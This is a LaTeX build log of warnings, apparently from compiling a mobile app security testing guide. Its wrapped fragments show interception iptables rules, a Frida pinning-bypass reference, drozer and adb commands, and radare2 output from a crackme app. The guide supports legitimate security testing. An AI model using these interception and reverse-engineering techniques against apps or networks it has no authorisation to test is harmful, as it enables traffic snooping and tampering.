 []\TU/SourceSansPro(0)/bx/n/10.95 509

Overfull \hbox (0.10948pt too wide) detected at line 715
 []\TU/SourceSansPro(0)/m/n/10.95 509

Overfull \hbox (0.55843pt too wide) detected at line 817
 []\TU/SourceSansPro(0)/m/n/10.95 600
[7]
Overfull \hbox (0.35037pt too wide) detected at line 859
 []\TU/SourceSansPro(0)/m/n/10.95 640

Overfull \hbox (0.20802pt too wide) detected at line 876
 []\TU/SourceSansPro(0)/m/n/10.95 648

Overfull \hbox (0.20802pt too wide) detected at line 945
 []\TU/SourceSansPro(0)/m/n/10.95 684

Overfull \hbox (0.20802pt too wide) detected at line 946
 []\TU/SourceSansPro(0)/m/n/10.95 684

Underfull \hbox (badness 10000) in paragraph at lines 1011--1011
 [][] []\TU/SourceSansPro(0)/m/n/10.95 Determining Whether Native Methods Are E
xposed Through WebViews (MSTG- 
[8]
Overfull \hbox (0.55843pt too wide) detected at line 1066
 []\TU/SourceSansPro(0)/m/n/10.95 800

Overfull \hbox (0.35037pt too wide) detected at line 1076
 []\TU/SourceSansPro(0)/m/n/10.95 804

Overfull \hbox (0.10948pt too wide) detected at line 1080
 []\TU/SourceSansPro(0)/m/n/10.95 805

Overfull \hbox (0.10948pt too wide) detected at line 1081
 []\TU/SourceSansPro(0)/m/n/10.95 805

Overfull \hbox (0.72267pt too wide) detected at line 1125
 []\TU/SourceSansPro(0)/bx/n/10.95 838

Overfull \hbox (0.35037pt too wide) detected at line 1132
 []\TU/SourceSansPro(0)/m/n/10.95 840

Overfull \hbox (0.14233pt too wide) detected at line 1141
 []\TU/SourceSansPro(0)/m/n/10.95 844

Overfull \hbox (0.14233pt too wide) detected at line 1142
 []\TU/SourceSansPro(0)/m/n/10.95 844

Overfull \hbox (0.14233pt too wide) detected at line 1143
 []\TU/SourceSansPro(0)/m/n/10.95 844

Overfull \hbox (0.20802pt too wide) detected at line 1147
 []\TU/SourceSansPro(0)/m/n/10.95 846

Overfull \hbox (0.20802pt too wide) detected at line 1148
 []\TU/SourceSansPro(0)/m/n/10.95 846

Overfull \hbox (1.18257pt too wide) detected at line 1153
 []\TU/SourceSansPro(0)/bx/n/10.95 848

Overfull \hbox (0.20802pt too wide) detected at line 1154
 []\TU/SourceSansPro(0)/m/n/10.95 848
[9]) [10]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6c9ef3f29742285f2d7e09d0c076a66855521a28.
png" > [11]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/997b3fc8f69d8fa1fd9853b14a99a208461549eb.
png" > [12] [13] [14] [15]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/ccba17705245f8560d8a34338e189f56fd492cf8.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/be368d70157fbfbee3a68fb706425b2117ca985a.
png" > [16] [17] [18] [19]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/db1eb1182c61b69cf4140a62eec441c2a36e2252.
jpg" > [20] [21] [22] [23] [24] [25] [26] [27] [28] [29]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/29ee4afc5b34f4de27f808c55317ab17b193fa4c.
png" > [30] [31] [32] [33] [34] [35]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/1ac849125c0802c1919c86dd62f13c49723742af.
jpg" > [36] [37] [38]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/28bf4372b490e7da769b83110e865b5dfbbac14d.
jpg" > [39]
Underfull \hbox (badness 1852) in paragraph at lines 2081--2090
[]\TU/SourceSansPro(0)/m/n/10.95 Infrastructure as Code also facilitates the co
nstruction of the environments required by classical

Underfull \hbox (badness 1655) in paragraph at lines 2081--2090
\TU/SourceSansPro(0)/m/n/10.95 software creation projects, for \TU/SourceSansPr
o(0)/bx/n/10.95 development \TU/SourceSansPro(0)/m/n/10.95 (“DEV”), \TU/SourceS
ansPro(0)/bx/n/10.95 integration \TU/SourceSansPro(0)/m/n/10.95 (“INT”), \TU/So
urceSansPro(0)/bx/n/10.95 testing \TU/SourceSansPro(0)/m/n/10.95 (“PPR” for Pre
-
[40] [41]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/475043742486ea4fadf4922cde94a2395cceba4a.
jpg" > [42] [43] [44] [45]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/b8545a63bbbd33e84277034f5674e52d35eb224c.
png" > [46] [47]
Underfull \hbox (badness 5908) in paragraph at lines 2610--2613
[]\TU/SourceSansPro(0)/m/n/10.95 Universal Android SSL Pinning Bypass with Frid
a - [][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][] [] [][][]
[][][][][][][][] []
[48] [49]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/9a0c01a9582fcd5d3aac500e683e7ba7cfbab2fe.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/186d6939c74e4d7ed97a499be236f2eae40edfb4.
png" > [50]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/222cb525d0a89b02ee9868add6220f38f7d8eec4.
png" > [51]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/f5ea8252ffeab6775a9e3cc315bf3623aacaa026.
png" > [52]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/7565cd5bcb1af1b7f77b1001570b2035da0e0358.
png" > [53]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/54f39a0e594a78d2ceefec1465e3e353b39e1f8e.
png" > [54] [55] [56] [57]
Underfull \hbox (badness 1342) in paragraph at lines 2987--2990
[]\TU/SourceSansPro(0)/m/n/10.95 [#vadla] Ole André Vadla Ravnås, Anatomy of a 
code tracer - [][]$[][][][][] [] [] [] [][][][][][] [] [][][] [] [][][][][][][]
 []

Underfull \hbox (badness 3449) in paragraph at lines 2990--2993
\TU/SourceSansPro(0)/m/n/10.95 chine based software protections - [][]$[][][][]
[] [] [] [] [][][][][][] [] [][][][][][][][][] [] [][][] [] [][][][][] [] [][][
][][][][][] [][] [][][] [][] [][][][][][][] [][]
[58] [59] [60] [61] [62]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/5adbeedbb4e9578327329ff2b30517e548450d8e.
png" > [63]
Overfull \hbox (119.56647pt too wide) in paragraph at lines 3368--3371
[]\TU/SourceSansPro(0)/m/n/10.95 Take the SHA-1 hash of the result of step 1 (e
.g.: the hash of \TU/SourceCodePro(6)/m/n/10.95 test \TU/SourceSansPro(0)/m/n/1
0.95 is \TU/SourceCodePro(6)/m/n/10.95 A94A8FE5CCB19BA61C4C0873D391E987982FBBD3
\TU/SourceSansPro(0)/m/n/10.95 ). 

Overfull \hbox (72.01427pt too wide) in paragraph at lines 3375--3382
[]\TU/SourceSansPro(0)/m/n/10.95 Iterate through the result and look for the re
st of the hash (e.g. is \TU/SourceCodePro(6)/m/n/10.95 FE5CCB19BA61C4C0873D391E
987982FBBD3

Overfull \hbox (194.01184pt too wide) in paragraph at lines 3375--3382
\TU/SourceSansPro(0)/m/n/10.95 will return a counter showing how many times it 
has been found in breaches (e.g.: \TU/SourceCodePro(6)/m/n/10.95 FE5CCB19BA61C4
C0873D391E987982FBBD3:76479\TU/SourceSansPro(0)/m/n/10.95 ). 
[64]
Underfull \hbox (badness 1107) in paragraph at lines 3471--3476
[]\TU/SourceSansPro(0)/m/n/10.95 Load or paste the list of passwords you want t
o try. There are several resources available
[65]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/ef35163475f90699bc1e3dc9c0670e1dcb0a0f68.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6b817d1ce3fb5ecf5ff181554fb12a94aaec6e01.
png" > [66] [67] [68] [69] [70]
Underfull \hbox (badness 10000) in paragraph at lines 3840--3846

[71]
Underfull \hbox (badness 1052) in paragraph at lines 3878--3881
[]\TU/SourceSansPro(0)/m/n/10.95 There are various two-factor authentication me
chanism available which can range from 3rd party
[72]
Overfull \hbox (62.69936pt too wide) in paragraph at lines 3940--3940
[]\TU/SourceCodePro(6)/m/n/10.95 <base64UrlEncode(header)>.<base64UrlEncode(pay
load)>.<base64UrlEncode(signature)>[] 

Overfull \hbox (509.45926pt too wide) in paragraph at lines 3947--3947
[]\TU/SourceCodePro(6)/m/n/10.95 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiO
iIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30R
MHrHDcEfxjoYZgeFONFh7HgQ[] 
[73] [74] [75] [76]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/de11985a944d62f6043f7925b67f1282123b016d.
png" > [77] [78] [79]
Underfull \hbox (badness 2237) in paragraph at lines 4467--4475
[]\TU/SourceSansPro(0)/m/n/10.95 In all cases, you should verify whether differ
ent devices are detected correctly. Therefore, the

Underfull \hbox (badness 2158) in paragraph at lines 4467--4475
\TU/SourceSansPro(0)/m/n/10.95 binding of the application to the actual device 
should be tested. In iOS, a developer can use

Underfull \hbox (badness 1377) in paragraph at lines 4467--4475
\TU/SourceCodePro(6)/m/n/10.95 identifierForVendor\TU/SourceSansPro(0)/m/n/10.9
5 , which is related to the bundle ID: the moment you change a bundle
[80] [81] [82]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/885ac03015d3917ef0a32901cacaf58cedaef149.
png" > [83] [84] [85]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/c3af2e2ee692b1d4abd115bece49476248ffa13d.
png" > [86] [87]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/23e89c95e9bb3113d34778f0cba467e2ded7bdb9.
png" > [88] [89]
Overfull \hbox (104.30946pt too wide) in paragraph at lines 5065--5065
[]    \TU/SourceCodePro(6)/m/n/10.95 # iptables will NAT connections from AP ne
twork interface to the target network interface[] 

Overfull \hbox (47.36942pt too wide) in paragraph at lines 5065--5065
[]    \TU/SourceCodePro(6)/m/n/10.95 $ iptables --table nat --append POSTROUTIN
G --out-interface wlan0 -j MASQUERADE[] 
[90] [91]
Overfull \hbox (141.53944pt too wide) in paragraph at lines 5153--5153
[]    \TU/SourceCodePro(6)/m/n/10.95 $ sudo iptables -t nat -A PREROUTING -p tc
p --dport 443 -j DNAT --to-destination 127.0.0.1:8080[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/db6c108c5b7ef9e975feeffbd8dfd088fe39edea.
png" > [92] [93]
Overfull \hbox (111.09839pt too wide) in paragraph at lines 5294--5296
[]\TU/SourceSansPro(0)/m/n/10.95 Cipher suites have the following structure: \T
U/SourceSansPro(0)/bx/n/10.95 Protocol_KeyExchangeAlgorithm_WITH_BlockCipher_In
tegrityCheckAlgorithm 
[94] [95] [96] [97] [98]
Underfull \hbox (badness 10000) in paragraph at lines 5691--5694
[]\TU/SourceSansPro(0)/m/n/10.95 Android supported Cipher suites - [][]$[][][][
][] [] [] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] [][][][][][][][]
[] [] [][][][][] [] [][][] [] [][][] []

Underfull \hbox (badness 10000) in paragraph at lines 5726--5728
[]\TU/SourceSansPro(0)/m/n/10.95 Recommendations for a cipher string - [][]$[][
][][][] [] [] [] [][][][][][] [] [][][] [] [][][][][] [] [][][][][][][][][][][]
[][][][][] [] [][][][] []
[99]
Underfull \hbox (badness 10000) in paragraph at lines 5739--5742
[] [] [][][] [] [][][][][][][][][][][] [] [][][] [] [][][] [][] [][][][][][][][
] [][] [][][] [][] [][][] [][] [][][][][][] [][] [][][][][][][][] [][] [][][][]
[][][] [][] [][][] [][] [][][][] [][] [][] [][] [] [][] [][][][][][] [][]

Underfull \hbox (badness 10000) in paragraph at lines 5759--5761
[][][]$[][][][][] [] [] [] [][][][][][][][][][][] [] [][][][] [] [][][] [] [][]
 [] [][] [] [][][][][][][] [] [][][][][][] [] [][][][][][][] [][] [][][] [][] [
][][][][][][][] [][] [][][][][] [][] [][][][][] [][]
[100] [101] [102] [103]
Overfull \hbox (145.9194pt too wide) in paragraph at lines 6061--6061
[]\TU/SourceCodePro(6)/m/n/10.95 1. The password to the client certificate isn[
]t stored locally or is locked in the device Keychain.[] 
[104] [105] [106]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/8c5c6e36f8f96c2a99d646eadbb33514e8031732.
png" > [107] [108] [109] [110] [111] [112] [113] [114]
Overfull \hbox (46.27438pt too wide) in paragraph at lines 6717--6717
 []\TU/SourceCodePro(6)/m/n/10.95 $ am start -n com.quora.android/com.quora.and
roid.ActionBarContentActivity \[] 

Overfull \hbox (24.37439pt too wide) in paragraph at lines 6725--6725
 []\TU/SourceCodePro(6)/m/n/10.95 $ am start -n com.quora.android/com.quora.and
roid.ModalContentActivity  \[] 
[115] [116] [117] [118] [119] [120] [121]
Underfull \hbox (badness 10000) in paragraph at lines 7215--7218
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Human Interface Guidelines - [][]$[][][]
[][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][][][][] [] [][
][][][] [][] [][][][][][][][][] [][]
[122]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/1f7368a68bdac5245a0c8f7dea8e9f7f271617de.
png" > [123]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/b95a89677543656fa89bd7246356c2a701a1d247.
png" > [124] [125] [126] [127] [128] [129]
Overfull \hbox (49.19812pt too wide) in paragraph at lines 7594--7597
[]\TU/SourceSansPro(0)/m/n/10.95 The relationship between group IDs and permiss
ions is defined in the file [][]frameworks/base/data/etc/platform.xml[][] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/4f788504cb27937eddb44c2ec5f319b376b249d4.
png" > [130]
Overfull \hbox (86.78952pt too wide) in paragraph at lines 7642--7642
[]\TU/SourceCodePro(6)/m/n/10.95 drwx------  4 u0_a97              u0_a97      
        4096 2017-01-18 14:27 com.android.calendar[] 

Overfull \hbox (78.02954pt too wide) in paragraph at lines 7642--7642
[]\TU/SourceCodePro(6)/m/n/10.95 drwx------  6 u0_a120             u0_a120     
        4096 2017-01-19 12:54 com.android.chrome[] 
[131]
Overfull \hbox (34.22937pt too wide) in paragraph at lines 7730--7730
[]\TU/SourceCodePro(6)/m/n/10.95 $ bundletool build-apks --bundle=/MyApp/my_app
.aab --output=/MyApp/my_app.apks[] 

Overfull \hbox (34.22937pt too wide) in paragraph at lines 7741--7741
[]\TU/SourceCodePro(6)/m/n/10.95 $ bundletool build-apks --bundle=/MyApp/my_app
.aab --output=/MyApp/my_app.apks[] 
[132] [133] [134] [135]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/deb1cf5c3b76357c39b70ee98334d01e70f1ea3b.
jpg" > [136] [137] [138]
Overfull \hbox (48.13965pt too wide) in paragraph at lines 8163--8167
[]\TU/SourceSansPro(0)/m/n/10.95 The other way is to create the receiver dynami
cally in code and register it with the [][]\TU/SourceCodePro(6)/m/n/10.95 Conte
xt.registerReceiver[][]
[139]
Underfull \hbox (badness 4084) in paragraph at lines 8210--8221
[]\TU/SourceSansPro(0)/m/n/10.95 If your app is not supposed to send broadcasts
 across apps, use a Local Broadcast Manager

Underfull \hbox (badness 1590) in paragraph at lines 8210--8221
\TU/SourceSansPro(0)/m/n/10.95 security and the efficiency of the app, as no in
terprocess communication is involved. However,

Underfull \hbox (badness 3354) in paragraph at lines 8228--8236
\TU/SourceSansPro(0)/m/n/10.95 receive \TU/SourceCodePro(6)/m/n/10.95 CONNECTIV
ITY_ACTION \TU/SourceSansPro(0)/m/n/10.95 broadcast unless they register their 
Broadcast Receivers with

Underfull \hbox (badness 4505) in paragraph at lines 8228--8236
\TU/SourceCodePro(6)/m/n/10.95 Context.registerReceiver()\TU/SourceSansPro(0)/m
/n/10.95 . The system does not send \TU/SourceCodePro(6)/m/n/10.95 ACTION_NEW_P
ICTURE \TU/SourceSansPro(0)/m/n/10.95 and

Underfull \hbox (badness 1694) in paragraph at lines 8237--8246
\TU/SourceSansPro(0)/m/n/10.95 no longer register Broadcast Receivers for impli
cit broadcasts in their manifest, except for those

Underfull \hbox (badness 3098) in paragraph at lines 8237--8246
\TU/SourceSansPro(0)/m/n/10.95 listed in [][]Implicit Broadcast Exceptions[][].
 The Broadcast Receivers created at runtime by calling

Overfull \hbox (105.39647pt too wide) in paragraph at lines 8247--8252
[]\TU/SourceSansPro(0)/m/n/10.95 According to [][]Changes to System Broadcasts[
][], beginning with Android 9 (API level 28), the \TU/SourceCodePro(6)/m/n/10.9
5 NETWORK_STATE_CHANGED_ACTION
[140] [141] [142]
Overfull \hbox (6.80698pt too wide) in paragraph at lines 8383--8388
[]\TU/SourceSansPro(0)/m/n/10.95 The above code defines a new permission named 
\TU/SourceCodePro(6)/m/n/10.95 com.permissions.sample.ACCESS_USER_INFO
[143]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/b49fc3618488c3a40ee2d09e488dd0d40ac9502f.
png" > [144]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6c3c805441548d38b63caf39920079fd1673c545.
png" > [145]
Overfull \hbox (334.2594pt too wide) in paragraph at lines 8550--8550
[]\TU/SourceCodePro(6)/m/n/10.95 $ keytool -genkey -alias myDomain -keyalg RSA 
-keysize 2048 -validity 7300 -keystore myKeyStore.jks -storepass myStrongPasswo
rd[] 
[146]
Overfull \hbox (14.51942pt too wide) in paragraph at lines 8595--8595
[]\TU/SourceCodePro(6)/m/n/10.95 $ apksigner sign --out mySignedApp.apk --ks my
KeyStore.jks myUnsignedApp.apk[] 
[147] [148]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/a92a527830c8d387b73bc3f82eb4c78e331d24dd.
jpg" > [149] [150]
Overfull \hbox (191.90938pt too wide) in paragraph at lines 8856--8856
[]\TU/SourceCodePro(6)/m/n/10.95 $ ./build/tools/make_standalone_toolchain.py -
-arch arm --api 24 --install-dir /tmp/android-7-toolchain[] 

Overfull \hbox (42.80989pt too wide) in paragraph at lines 8858--8864
[]\TU/SourceSansPro(0)/m/n/10.95 This creates a standalone toolchain for Androi
d 7.0 (API level 24) in the directory \TU/SourceCodePro(6)/m/n/10.95 /tmp/andro
id-7-toolchain\TU/SourceSansPro(0)/m/n/10.95 .
[151] [152] [153] [154] [155] [156]
Underfull \hbox (badness 1521) in paragraph at lines 9229--9233
[]\TU/SourceSansPro(0)/m/n/10.95 Frida server: Server for Frida, the dynamic in
strumentation toolkit for developers, reverse-
[157] [158]
Overfull \hbox (288.26935pt too wide) in paragraph at lines 9353--9353
[]\TU/SourceCodePro(6)/m/n/10.95 emulator-5554    device product:sdk_google_pho
ne_x86 model:Android_SDK_built_for_x86 device:generic_x86 transport_id:1[] 
[159] [160]
Overfull \hbox (42.98941pt too wide) in paragraph at lines 9468--9468
[]\TU/SourceCodePro(6)/m/n/10.95 I: Loading resource table from file: /Users/sv
en/Library/apktool/framework/1.apk[] 
[161] [162]
Overfull \hbox (23.5873pt too wide) in paragraph at lines 9599--9607
[]\TU/SourceSansPro(0)/m/n/10.95 Again, without drozer this would have required
 several steps. The module \TU/SourceCodePro(6)/m/n/10.95 app.package.attacksur
face
[163] [164]
Overfull \hbox (121.8294pt too wide) in paragraph at lines 9662--9662
[]\TU/SourceCodePro(6)/m/n/10.95 $ dz> run app.broadcast.send --action (broadca
st receiver name) -- extra (number of arguments)[] 
[165] [166]
Overfull \hbox (316.7393pt too wide) in paragraph at lines 9807--9807
[]\TU/SourceCodePro(6)/m/n/10.95 $ wget https://github.com/frida/frida/releases
/download/$(frida --version)/frida-server-$(frida --version)-android-arm.xz[] 
[167] [168]
Overfull \hbox (288.26935pt too wide) in paragraph at lines 9962--9962
[]\TU/SourceCodePro(6)/m/n/10.95 [*] Instance found: android.view.View{7ccea78 
G.ED..... ......ID 0,0-0,0 #7f0c01fc app:id/action_bar_black_background}[] 

Overfull \hbox (255.41934pt too wide) in paragraph at lines 9962--9962
[]\TU/SourceCodePro(6)/m/n/10.95 [*] Instance found: android.view.View{2809551 
V.ED..... ........ 0,1731-0,1731 #7f0c01ff app:id/menu_anchor_stub}[] 

Overfull \hbox (353.96931pt too wide) in paragraph at lines 9962--9962
[]\TU/SourceCodePro(6)/m/n/10.95 [*] Instance found: android.view.View{be471b6 
G.ED..... ......I. 0,0-0,0 #7f0c01f5 app:id/location_bar_verbose_status_separat
or}[] 

Overfull \hbox (281.69933pt too wide) in paragraph at lines 9962--9962
[]\TU/SourceCodePro(6)/m/n/10.95 [*] Instance found: android.view.View{3ae0eb7 
V.ED..... ........ 0,0-1080,63 #102002f android:id/statusBarBackground}[] 
[169] [170] [171] [172]
Overfull \hbox (49.5594pt too wide) in paragraph at lines 10152--10152
[]\TU/SourceCodePro(6)/m/n/10.95 $ docker run -it -p 8000:8000 opensecurity/mob
ile-security-framework-mobsf:latest[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/942a2c3a332ff2a3c126cf220ad029722e4d7d8b.
png" > [173] [174] [175] [176] [177] [178] [179]
Overfull \hbox (126.2094pt too wide) in paragraph at lines 10532--10532
[]\TU/SourceCodePro(6)/m/n/10.95 0x0000073c [0x00000958 - 0x00000abc]    356 cl
ass 5 Lsg/vantagepoint/uncrackable1/MainActivity[] 

Overfull \hbox (25.46983pt too wide) in paragraph at lines 10532--10532
[]                                                                            \
TU/SourceCodePro(6)/m/n/10.95 :: Landroid/app/Activity;[] 

Overfull \hbox (69.2694pt too wide) in paragraph at lines 10532--10532
[]\TU/SourceCodePro(6)/m/n/10.95 0x00000958 method 0 pC   Lsg/vantagepoint/uncr
ackable1/MainActivity.method.<init>()V[] 

Overfull \hbox (152.48938pt too wide) in paragraph at lines 10532--10532
[]\TU/SourceCodePro(6)/m/n/10.95 0x00000970 method 1 P    Lsg/vantagepoint/uncr
ackable1/MainActivity.method.a(Ljava/lang/String;)V[] 

Overfull \hbox (205.04935pt too wide) in paragraph at lines 10532--10532
[]\TU/SourceCodePro(6)/m/n/10.95 0x000009c8 method 2 r    Lsg/vantagepoint/uncr
ackable1/MainActivity.method.onCreate(Landroid/os/Bundle;)V[] 

Overfull \hbox (191.90933pt too wide) in paragraph at lines 10532--10532
[]\TU/SourceCodePro(6)/m/n/10.95 0x00000a38 method 3 p    Lsg/vantagepoint/uncr
ackable1/MainActivity.method.verify(Landroid/view/View;)V[] 

Overfull \hbox (194.09938pt too wide) in paragraph at lines 10532--10532
[]\TU/SourceCodePro(6)/m/n/10.95 0x0000075c [0x00000acc - 0x00000bb2]    230 cl
ass 6 Lsg/vantagepoint/uncrackable1/a :: Ljava/lang/Object;[] 

Overfull \hbox (82.40936pt too wide) in paragraph at lines 10532--10532
[]\TU/SourceCodePro(6)/m/n/10.95 0x00000acc method 0 sp   Lsg/vantagepoint/uncr
ackable1/a.method.a(Ljava/lang/String;)Z[] 

Overfull \hbox (88.97937pt too wide) in paragraph at lines 10532--10532
[]\TU/SourceCodePro(6)/m/n/10.95 0x00000b5c method 1 sp   Lsg/vantagepoint/uncr
ackable1/a.method.b(Ljava/lang/String;)[B[] 
[180]
Overfull \hbox (259.79942pt too wide) in paragraph at lines 10550--10550
[]  \TU/SourceCodePro(6)/m/n/10.95 29 0x000005cc    NONE    FUNC Ljava/lang/Str
ingBuilder.method.append(Ljava/lang/String;)Ljava/lang/StringBuilder;[] 

Overfull \hbox (108.68944pt too wide) in paragraph at lines 10550--10550
[]  \TU/SourceCodePro(6)/m/n/10.95 30 0x000005d4    NONE    FUNC Ljava/lang/Str
ingBuilder.method.toString()Ljava/lang/String;[] 

Overfull \hbox (167.81941pt too wide) in paragraph at lines 10550--10550
[]  \TU/SourceCodePro(6)/m/n/10.95 32 0x000005e4    NONE    FUNC Ljava/lang/Sys
tem.method.getenv(Ljava/lang/String;)Ljava/lang/String;[] 

Overfull \hbox (240.0894pt too wide) in paragraph at lines 10550--10550
[]  \TU/SourceCodePro(6)/m/n/10.95 34 0x000005f4    NONE    FUNC Ljavax/crypto/
Cipher.method.getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;[] 

Overfull \hbox (75.83946pt too wide) in paragraph at lines 10550--10550
[]  \TU/SourceCodePro(6)/m/n/10.95 35 0x000005fc    NONE    FUNC Ljavax/crypto/
Cipher.method.init(ILjava/security/Key;)V[] 

Overfull \hbox (167.81941pt too wide) in paragraph at lines 10550--10550
[]  \TU/SourceCodePro(6)/m/n/10.95 36 0x00000604    NONE    FUNC Ljavax/crypto/
spec/SecretKeySpec.method.<init>([BLjava/lang/String;)V[] 

Overfull \hbox (163.43936pt too wide) in paragraph at lines 10575--10575
[]\TU/SourceCodePro(6)/m/n/10.95 0x00000a38 132 sym.Lsg_vantagepoint_uncrackabl
e1_MainActivity.method.verify_Landroid_view_View__V[] 

Overfull \hbox (189.71933pt too wide) in paragraph at lines 10575--10575
[]\TU/SourceCodePro(6)/m/n/10.95 0x00000a38 132 method.public.Lsg_vantagepoint_
uncrackable1_MainActivity.Lsg_vantagepoint_uncrackable1[] 

Overfull \hbox (97.73969pt too wide) in paragraph at lines 10575--10575
[]                                                        \TU/SourceCodePro(6)/
m/n/10.95 _MainActivity.method.verify_Landroid_view_View__V[] 

Overfull \hbox (170.00935pt too wide) in paragraph at lines 10583--10583
[]\TU/SourceCodePro(6)/m/n/10.95 [0x000009c8]> s sym.Lsg_vantagepoint_uncrackab
le1_MainActivity.method.verify_Landroid_view_View__V[] 
[181]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/ff8101e999d5401645a7e1396652c25dd93ab67e.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/1d1be24e834cab37f189d60c9d349789b2bdb0ae.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/853fd16c4f9112caf782ed394cb3bbc36b10900e.
png" > [182]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/74c7cf937d32349f587ab60d3a77f769b2e7ba77.
png" > [183]
Overfull \hbox (40.79942pt too wide) in paragraph at lines 10726--10726
[]\TU/SourceCodePro(6)/m/n/10.95 0x561f072d89ee hit12_0 unacceptable policyunsu
pported md algorithmvar bad valuec[] 
[184]
Overfull \hbox (34.22949pt too wide) in paragraph at lines 10726--10726
[]\TU/SourceCodePro(6)/m/n/10.95 0x561f0732a91a hit12_1 unacceptableSearching 1
2 bytes: 75 6e 61 63 63 65 70 74 61[] 

Overfull \hbox (1978.94905pt too wide) in paragraph at lines 10741--10741
[]\TU/SourceCodePro(6)/m/n/10.95 {"address":"0x561f072c4223","size":12,"flag":"
hit14_1","content":"unacceptable policyunsupported md algorithmvar bad valuec0"
},{"address":"0x561f072c4275","size":12,"flag":"hit14_2","content":"unacceptabl
eSearching 12 bytes: 75 6e 61 63 63 65 70 74 61"},{"address":"0x561f072c42c8","
size":12,"flag":"hit14_3","content":"unacceptableSearching 12 bytes: 75 6e 61 6
3 63 65 70 74 61 "},[] 
[185] [186]
Overfull \hbox (9.28828pt too wide) in paragraph at lines 10877--10882
[]\TU/SourceSansPro(0)/m/n/10.95 Disconnect the USB cable from the target devic
e and run \TU/SourceCodePro(6)/m/n/10.95 adb connect <device_ip_address>\TU/Sou
rceSansPro(0)/m/n/10.95 .
[187] [188]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/3933903697e015a01f618c96228f42937b14019b.
png" > [189]
Overfull \hbox (34.2294pt too wide) in paragraph at lines 11037--11037
[]\TU/SourceCodePro(6)/m/n/10.95 Successfully downloaded ... to sg.vp.owasp_mob
ile.omtg_android_preferences.xml[] 
[190]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/c2929f644815f079c32d8d19c05474b920ef29ab.
png" > [191] [192] [193] [194] [195] [196]
Underfull \hbox (badness 3128) in paragraph at lines 11415--11419
[]\TU/SourceSansPro(0)/m/n/10.95 Here’s a non-exhaustive list of some info and 
the corresponding keywords that you can easily
[197]
Overfull \hbox (176.57875pt too wide) in paragraph at lines 11524--11524
[]\TU/SourceCodePro(6)/m/n/10.95 ----------------------  ----------------------
-----------------------------------------------------[] 

Overfull \hbox (36.41943pt too wide) in paragraph at lines 11524--11524
[]\TU/SourceCodePro(6)/m/n/10.95 codeCacheDirectory      /data/user/0/sg.vp.owa
sp_mobile.omtg_android/code_cache[] 

Overfull \hbox (143.72934pt too wide) in paragraph at lines 11524--11524
[]\TU/SourceCodePro(6)/m/n/10.95 externalCacheDirectory  /storage/emulated/0/An
droid/data/sg.vp.owasp_mobile.omtg_android/cache[] 

Overfull \hbox (62.69946pt too wide) in paragraph at lines 11524--11524
[]\TU/SourceCodePro(6)/m/n/10.95 obbDir                  /storage/emulated/0/An
droid/obb/sg.vp.owasp_mobile.omtg_android[] 

Overfull \hbox (161.2494pt too wide) in paragraph at lines 11524--11524
[]\TU/SourceCodePro(6)/m/n/10.95 packageCodePath         /data/app/sg.vp.owasp_
mobile.omtg_android-kR0ovWl9eoU_yh0jPJ9caQ==/base.apk[] 
[198]
Overfull \hbox (2.69832pt too wide) in paragraph at lines 11531--11535
[]\TU/SourceSansPro(0)/m/n/10.95 The internal data directory (aka. sandbox dire
ctory) which is at \TU/SourceCodePro(6)/m/n/10.95 /data/data/[package-name]
[199]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/f313f719cdfa7959e664fd2e21f53a9fcf7d6866.
png" >
Overfull \hbox (12.3294pt too wide) in paragraph at lines 11651--11651
[]\TU/SourceCodePro(6)/m/n/10.95 $ adb logcat | grep "$(adb shell ps | grep <pa
ckage-name> | awk []{print $2}[])"[] 
[200]
Underfull \hbox (badness 1688) in paragraph at lines 11689--11691
[]\TU/SourceSansPro(0)/m/n/10.95 In certain production builds, you might encoun
ter an error \TU/SourceCodePro(6)/m/n/10.95 mount: []/system[] not in

Overfull \hbox (14.51942pt too wide) in paragraph at lines 11715--11715
